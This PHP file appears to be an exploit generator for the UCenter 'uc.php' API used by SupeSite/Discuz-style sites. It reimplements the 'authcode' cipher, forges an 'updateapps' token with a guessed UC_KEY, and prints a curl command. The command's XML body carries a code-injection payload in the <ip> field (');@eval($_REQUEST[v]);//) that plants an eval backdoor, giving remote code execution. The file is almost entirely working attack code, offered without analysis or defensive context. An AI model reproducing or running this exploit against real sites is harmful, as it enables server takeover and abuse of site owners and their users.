<?php
//define('IN_SUPESITE', 1);

//include_once 'config.php';
//@include_once 'data/system/config.cache.php';

define('UC_KEY', '123456789');

$_SGLOBAL = array();
$_SCONFIG['ucmode'] = 0;	//default value

function authcode( $string, $operation, $key = "", $expiry = 0)
{
    global $_SGLOBAL;
    global $_SCONFIG;
	//var_dump($_SCONFIG);
    if ( empty( $_SCONFIG['ucmode'] ) )
    {
        $auth_key = !empty( $key ) ? $key : $_SGLOBAL['authkey'];
		//var_dump($auth_key);
        $key = md5( $auth_key );
        $key_length = strlen( $key );
        $string = $operation == "DECODE" ? base64_decode( $string ) : substr( md5( $string.$key ), 0, 8 ).$string;
        $string_length = strlen( $string );
        $rndkey = $box = array( );
        $result = "";
        $i = 0;
        for ( ; $i <= 255; ++$i )
        {
            $rndkey[$i] = ord( $key[$i % $key_length] );
            $box[$i] = $i;
        }
        $j = $i = 0;
        for ( ; $i < 256; ++$i )
        {
            $j = ( $j + $box[$i] + $rndkey[$i] ) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        $a = $j = $i = 0;
        for ( ; $i < $string_length; ++$i )
        {
            $a = ( $a + 1 ) % 256;
            $j = ( $j + $box[$a] ) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr( ord( $string[$i] ) ^ $box[( $box[$a] + $box[$j] ) % 256] );
        }
        if ( $operation == "DECODE" )
        {
            if ( substr( $result, 0, 8 ) == substr( md5( substr( $result, 8 ).$key ), 0, 8 ) )
            {
                return substr( $result, 8 );
            }
            else
            {
                return "";
            }
        }
        else
        {
            return str_replace( "=", "", base64_encode( $result ) );
        }
    }
    else
    {
        $ckey_length = 4;
        $key = md5( $key ? $key : $_SGLOBAL['authkey'] );
        $keya = md5( substr( $key, 0, 16 ) );
        $keyb = md5( substr( $key, 16, 16 ) );
        $keyc = $ckey_length ? $operation == "DECODE" ? substr( $string, 0, $ckey_length ) : substr( md5( microtime( ) ), 0 - $ckey_length ) : "";
        $cryptkey = $keya.md5( $keya.$keyc );
        $key_length = strlen( $cryptkey );
        $string = $operation == "DECODE" ? base64_decode( substr( $string, $ckey_length ) ) : sprintf( "%010d", $expiry ? $expiry + time( ) : 0 ).substr( md5( $string.$keyb ), 0, 16 ).$string;
        $string_length = strlen( $string );
        $result = "";
        $box = range( 0, 255 );
        $rndkey = array( );
        $i = 0;
        for ( ; $i <= 255; ++$i )
        {
            $rndkey[$i] = ord( $cryptkey[$i % $key_length] );
        }
        $j = $i = 0;
        for ( ; $i < 256; ++$i )
        {
            $j = ( $j + $box[$i] + $rndkey[$i] ) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        $a = $j = $i = 0;
        for ( ; $i < $string_length; ++$i )
        {
            $a = ( $a + 1 ) % 256;
            $j = ( $j + $box[$a] ) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr( ord( $string[$i] ) ^ $box[( $box[$a] + $box[$j] ) % 256] );
        }
        if ( $operation == "DECODE" )
        {
            if ( ( substr( $result, 0, 10 ) == 0 || 0 < substr( $result, 0, 10 ) - time( ) ) && substr( $result, 10, 16 ) == substr( md5( substr( $result, 26 ).$keyb ), 0, 16 ) )
            {
                return substr( $result, 26 );
            }
            else
            {
                return "";
            }
        }
        else
        {
            return $keyc.str_replace( "=", "", base64_encode( $result ) );
        }
    }
}


$timestamp = time()+10*3600;
$code = authcode("time=$timestamp&action=updateapps", 'ENCODE', UC_KEY);

echo 'curl ';
echo 'http://localhost/blog/api/uc.php?code=' . rawurlencode($code);
echo '--data ';
$xml = '\'<?xml version="1.0" encoding="ISO-8859-1"?><root><item><appid>18</appid><ip>xxx\\\');@eval($_REQUEST[v]);//</ip></item></root>\'';
echo htmlspecialchars($xml);
?>